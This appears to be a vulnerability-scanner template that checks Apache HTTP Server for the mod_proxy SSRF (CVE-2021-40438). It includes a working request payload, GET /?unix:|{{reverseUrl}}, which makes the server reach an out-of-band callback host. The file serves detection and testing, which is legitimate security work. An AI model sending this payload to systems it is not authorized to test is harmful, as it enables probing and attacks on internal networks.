name: Apache__=_2.4.48_Mod_Proxy_SSRF__CVE_2021_40438
transport: http
detail:
  dock: server="Apache" || app="APACHE-Web-Server"
  product: Apache
  homepage: http://httpd.apache.org/
  impact: <p>SSRF vulnerability exists in Apache HTTP Server 2.4.48 and earlier versions,Attackers
    can use this vulnerability to scan the external network, the internal network
    where the server is located, and the local port scan, and attack applications
    running on the internal network or local, etc.</p>
  description: <p>Apache HTTP Server is an open source web server of the Apache Foundation.</p><p>SSRF
    vulnerability exists in Apache HTTP Server 2.4.48 and earlier versions,a crafted
    request uri-path can cause mod_proxy to forward the request to an origin server
    choosen by the remote user.</p>
set:
  reverse: newReverse()
  reverseUrl: reverse.url
rules:
  r1:
    method: GET
    path: /?unix:|{{reverseUrl}}
    follow_redirects: true
    expression: reverse.wait(5)
expression: r1()
